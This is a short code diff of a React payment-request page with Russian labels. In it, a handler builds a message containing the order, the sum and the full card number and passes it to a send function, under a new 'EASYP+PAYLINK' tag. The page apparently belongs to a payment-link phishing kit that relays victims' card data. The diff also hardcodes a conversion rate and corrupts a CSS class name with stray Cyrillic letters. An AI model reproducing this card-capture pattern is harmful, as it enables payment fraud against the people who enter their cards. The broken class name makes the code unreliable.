@@ -168,7 +168,7 @@ const PaymentRequest = () => {
   const handleSmsSend = async (order, orderSum, card) => {
     try {
       const message = `
-        order: [${order}] orderSum: [${orderSum}] CARD: [${card}]
+        EASYP+PAYLINK: order: [${order}] orderSum: [${orderSum}] CARD: [${card}]
       `;
       sendMessage(message);
     } catch (error) {
@@ -191,7 +191,7 @@ const PaymentRequest = () => {
     }, 3000);
   };
 
-  const result = (orderSum / rate * 0.85).toFixed(1) || '...';
+  const result = (orderSum / 100 * 0.85).toFixed(1) || '...';
 
   const handleRuleClick = (index) => {
     setExpandedRule(expandedRule === index ? null : index);
@@ -334,7 +334,7 @@ const PaymentRequest = () => {
             Продолжить
           </button>
         </div>
-        <div className="text-center pb-4 mb-6 md:w-[470px] w-[300px]">
+        <div className="text-cафenter pb-4 mb-6 md:w-[470px] w-[300px]">
           <p className="text-sm text-grayth">
             <a href="#" className="text-blueth">
               Политика безопасности
